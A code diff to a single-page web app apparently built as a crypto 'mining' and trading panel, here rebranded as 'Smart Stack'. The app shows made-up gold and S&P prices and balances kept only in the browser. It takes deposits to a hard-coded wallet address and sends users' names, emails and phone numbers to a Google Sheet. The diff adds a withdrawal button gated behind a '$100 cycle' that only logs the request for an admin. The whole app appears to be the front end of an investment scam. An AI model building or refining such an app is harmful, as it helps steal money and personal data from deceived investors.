@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Investor Trader Panel</title>
+    <title>Smart Stack</title>
     <style>
         * {
             box-sizing: border-box;
@@ -60,7 +60,7 @@
         .ticker-text {
             display: inline-block;
             padding-left: 100%;
-            animation: ticker 16s linear infinite;
+            animation: ticker 18s linear infinite;
         }
         @keyframes ticker {
             0% { transform: translate3d(0, 0, 0); }
@@ -128,7 +128,7 @@
             border-color: #38bdf8;
         }
 
-        /* Sync Loading Overlay (30s) */
+        /* 30s Sync Loading Overlay */
         #sync-overlay {
             display: none;
             position: fixed;
@@ -291,7 +291,7 @@
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 10px;
-            margin-bottom: 18px;
+            margin-bottom: 10px;
         }
         .btn-green {
             background: #059669;
@@ -318,6 +318,23 @@
             transition: transform 0.15s ease;
         }
         .btn-white:active { transform: scale(0.95); }
+
+        /* Yellow Withdrawal Button Center */
+        .btn-yellow-withdraw {
+            width: 100%;
+            background: linear-gradient(135deg, #FFD700, #d97706);
+            color: #000000;
+            border: none;
+            padding: 13px;
+            border-radius: 8px;
+            font-weight: 800;
+            font-size: 13px;
+            cursor: pointer;
+            margin-bottom: 18px;
+            box-shadow: 0 4px 14px rgba(255, 215, 0, 0.3);
+            transition: transform 0.15s ease;
+        }
+        .btn-yellow-withdraw:active { transform: scale(0.96); }
 
         /* Daily Mining History White Card */
         .history-card {
@@ -492,9 +509,9 @@
 </head>
 <body>
 
-<!-- Top Yellow Running Ticker -->
+<!-- Top Yellow Running Ticker with Welcome Line -->
 <div class="top-ticker">
-    <div class="ticker-text">🚀 SPECIAL OFFER: DEPOSIT $200 AND GET AN INSTANT $5 BONUS IMMEDIATELY! LIMITED TIME OFFER! 🚀</div>
+    <div class="ticker-text">🔥 WELCOME TO SMART STACK PANEL | 🚀 SPECIAL OFFER: DEPOSIT $200 AND GET AN INSTANT $5 BONUS IMMEDIATELY! LIMITED TIME OFFER! 🚀</div>
 </div>
 
 <!-- Stars Animated Background -->
@@ -509,10 +526,10 @@
     <div id="sync-timer-text" style="font-size: 12px; font-weight: bold; color: #fbbf24; font-family: monospace;">Please wait: 30s</div>
 </div>
 
-<!-- Registration Screen (Updated Placeholders: John & Max) -->
+<!-- Registration Screen -->
 <div class="auth-wrapper" id="auth-screen">
     <div class="auth-title">Account Sign Up</div>
-    <div class="auth-sub">Enter details to access the Trading Dashboard</div>
+    <div class="auth-sub">Enter details to access the Smart Stack Panel</div>
     
     <div class="input-group">
         <label>First Name</label>
@@ -537,7 +554,7 @@
 <!-- Main Application Dashboard -->
 <div class="main-wrapper" id="main-dashboard">
     <div class="app-header">
-        <h2>INVESTOR TRADER PANEL</h2>
+        <h2>SMART STACK PANEL</h2>
         <div class="sub-header">
             <span class="status-dot"></span>
             <span style="color:#10b981; font-weight:700;">LIVE MARKET</span>
@@ -553,12 +570,12 @@
         <button class="btn-change-pair" onclick="openPairSelectModal()">🔄 CHANGE PAIR</button>
     </div>
 
-    <!-- Mining Action Section -->
+    <!-- Mining Action Section (Fixed to MINE) -->
     <div id="mining-section">
-        <button class="btn" onclick="handleMiningClick()">🚀 MINI (15s CHART)</button>
+        <button class="btn" onclick="handleMiningClick()">🚀 MINE (15s CHART)</button>
     </div>
 
-    <!-- 2x2 Metric Cards Grid (Default Starts at $0.00) -->
+    <!-- 2x2 Metric Cards Grid -->
     <div class="stats-grid">
         <div class="metric-card card-lime">
             <div class="metric-title">Current Amount</div>
@@ -583,6 +600,9 @@
         <button class="btn-green" id="deposit-btn" onclick="openDepositModal()">Add Funds</button>
         <button class="btn-white" onclick="showPopup('⚖️ Rules & Legal Terms', 'All trades are subject to automated evaluation risk parameters, security clearance, and official session clearance.')">RULES & LEGAL PDF</button>
     </div>
+
+    <!-- Yellow Withdraw Button in Center -->
+    <button class="btn-yellow-withdraw" onclick="handleWithdrawalClick()">💰 WITHDRAW FUNDS</button>
 
     <!-- Daily Mining History Section -->
     <div class="history-card">
@@ -649,7 +669,7 @@
         container.appendChild(star);
     }
 
-    // 3. User Authentication with 1-to-1 Email & Phone Lock
+    // 3. User Authentication with 1-to-1 Lock & 30s Delay
     let currentUser = JSON.parse(localStorage.getItem('traderUser')) || null;
 
     function checkAuth() {
@@ -678,9 +698,7 @@
             return;
         }
 
-        // Strict 1-Email to 1-Phone Verification Lock
         let registeredUsers = JSON.parse(localStorage.getItem('registeredUsersList')) || [];
-        
         let emailExistsWithOtherPhone = registeredUsers.some(u => u.email === email && u.phone !== phone);
         let phoneExistsWithOtherEmail = registeredUsers.some(u => u.phone === phone && u.email !== email);
 
@@ -694,16 +712,13 @@
             return;
         }
 
-        // Add to locked users list
         if (!registeredUsers.some(u => u.email === email && u.phone === phone)) {
             registeredUsers.push({ email, phone });
             localStorage.setItem('registeredUsersList', JSON.stringify(registeredUsers));
         }
 
-        // Send to Google Sheet
-        sendToGoogleSheet(fname + " " + lname, email, phone, "SIGNUP", "-", "-", "No SS", "Verified");
+        sendToGoogleSheet(fname + " " + lname, email, phone, "SIGNUP", "-", "-", "No SS", "Active");
 
-        // 30 Seconds Delay Screen
         document.getElementById('auth-screen').style.display = 'none';
         const syncOverlay = document.getElementById('sync-overlay');
         const syncFill = document.getElementById('sync-fill');
@@ -748,7 +763,7 @@
         checkAuth();
     }
 
-    // 4. Deposit Management with Updated Address & Min $100 Rule
+    // 4. Deposit Management
     const myDepositAddress = "0xfeff2067ef1a43aa4bca186f702b2669971debbd";
 
     function checkDepositStatus() {
@@ -862,7 +877,69 @@
         reader.readAsDataURL(file);
     }
 
-    // 5. Persistent Balances Engine (Default at $0.00)
+    // 5. Withdrawal Logic ($100 Cycle Check)
+    function handleWithdrawalClick() {
+        let currentDeposit = parseFloat(localStorage.getItem('depositBal')) || 0.00;
+        let currentAmount = parseFloat(localStorage.getItem('currentBal')) || 0.00;
+
+        // Check if $100 cycle completed
+        if (currentDeposit < 100.00 && currentAmount < 100.00) {
+            showPopup(
+                '⚠️ Withdrawal Requirement',
+                'Once you complete your $100 cycle, after that you can withdraw up to $50 minimum.'
+            );
+            return;
+        }
+
+        // If cycle completed, open withdrawal request form
+        let withdrawHtml = `
+            <div style="text-align:left; font-size:12px; color:#cbd5e1; line-height:1.5;">
+                <p style="margin:0 0 6px 0; font-weight:bold; color:#f8fafc;">Withdrawal Gateway (BEP20 USDT):</p>
+                <div class="input-group" style="margin-bottom:10px;">
+                    <label>Your BEP20 Wallet Address</label>
+                    <input type="text" id="wd-address" class="input-control" placeholder="0x..." style="padding:8px 10px;">
+                </div>
+                <div class="input-group" style="margin-bottom:14px;">
+                    <label>Withdraw Amount ($) [Min $50]</label>
+                    <input type="number" id="wd-amount" min="50" class="input-control" placeholder="e.g. 50" style="padding:8px 10px;">
+                </div>
+                <button class="btn" style="background:#d97706; margin-bottom:0;" onclick="submitWithdrawalRequest()">Submit Withdrawal Request</button>
+            </div>
+        `;
+        showPopup('💰 Withdraw Funds', '');
+        document.getElementById('modal-body').innerHTML = withdrawHtml;
+    }
+
+    function submitWithdrawalRequest() {
+        const addr = document.getElementById('wd-address').value.trim();
+        const amtInput = document.getElementById('wd-amount').value.trim();
+        const amt = parseFloat(amtInput);
+
+        if (!addr || isNaN(amt) || amt < 50) {
+            alert('Minimum withdrawal amount is $50.00 and valid BEP20 address is required.');
+            return;
+        }
+
+        if (currentUser) {
+            sendToGoogleSheet(
+                currentUser.fname + " " + currentUser.lname,
+                currentUser.email,
+                currentUser.phone,
+                "WITHDRAWAL_REQUEST",
+                "$" + amt.toFixed(2),
+                addr,
+                "Withdrawal",
+                "Pending"
+            );
+        }
+
+        closePopup();
+        setTimeout(() => {
+            showPopup('✅ Withdrawal Submitted', `Your withdrawal request of $${amt.toFixed(2)} has been submitted to Admin for processing.`);
+        }, 300);
+    }
+
+    // 6. Persistent Balances Engine
     function loadSavedBalances() {
         let currentBal = parseFloat(localStorage.getItem('currentBal')) || 0.00;
         let depositBal = parseFloat(localStorage.getItem('depositBal')) || 0.00;
@@ -875,7 +952,7 @@
         document.getElementById('val-withdrawal').innerText = "$" + withdrawalBal.toFixed(2);
     }
 
-    // 6. Market Rates Engine
+    // 7. Market Rates Engine (Live Feeds)
     let currentPair = 'GOLD';
     let livePrices = { GOLD: 4203.00, SILVER: 29.45, SP500: 5540.20 };
 
@@ -889,8 +966,8 @@
         } catch (e) {
             livePrices.GOLD += (Math.random() * 0.6 - 0.3);
         }
-        livePrices.SILVER = (livePrices.GOLD * 0.007) + (Math.random() * 0.05);
-        livePrices.SP500 = 5540.00 + (Math.random() * 2.0 - 1.0);
+        livePrices.SILVER = (livePrices.GOLD * 0.00701) + (Math.random() * 0.04);
+        livePrices.SP500 = 5542.50 + (Math.random() * 2.0 - 1.0);
 
         updateActiveDisplayPrice();
     }
@@ -932,13 +1009,13 @@
         let quotesHtml = `
             <div class="quote-row"><span class="quote-symbol">GOLD (XAUUSD)</span><span class="quote-price">$${livePrices.GOLD.toFixed(2)}</span></div>
             <div class="quote-row"><span class="quote-symbol">SILVER (XAGUSD)</span><span class="quote-price">$${livePrices.SILVER.toFixed(2)}</span></div>
-            <div class="quote-row"><span class="quote-symbol">S&P 500 (SP500)</span><span class="quote-price">$${livePrices.SP500.toFixed(2)}</span></div>
+            <div class="quote-row"><span class="quote-symbol">S&P 500 (US500)</span><span class="quote-price">$${livePrices.SP500.toFixed(2)}</span></div>
         `;
         showPopup('📊 Real-Time Market Quotes', '');
         document.getElementById('modal-body').innerHTML = quotesHtml;
     }
 
-    // 7. Live Candlestick Canvas Chart
+    // 8. Live Candlestick Canvas Chart
     function openNativeChartModal() {
         let chartHtml = `
             <div style="background:#020617; padding:10px; border-radius:10px; text-align:center;">
@@ -981,7 +1058,7 @@
         }
     }
 
-    // 8. Live Clock
+    // 9. Live Clock
     function updateClock() {
         const now = new Date();
         const timeStr = now.toLocaleTimeString('en-US', { hour12: true, hour: '2-digit', minute: '2-digit', second: '2-digit' });
@@ -991,7 +1068,7 @@
     setInterval(updateClock, 1000);
     updateClock();
 
-    // 9. Mining Engine (Requires Positive Balance)
+    // 10. Mining Engine (Requires Positive Balance)
     function loadMiningHistory() {
         let historyLogs = JSON.parse(localStorage.getItem('userMiningHistory')) || [];
         const tbody = document.getElementById('history-rows');
@@ -1100,7 +1177,7 @@
 
     function resetMiningUI() {
         document.getElementById('mining-section').innerHTML = `
-            <button class="btn" onclick="handleMiningClick()">🚀 MINI (15s CHART)</button>
+            <button class="btn" onclick="handleMiningClick()">🚀 MINE (15s CHART)</button>
         `;
     }
 
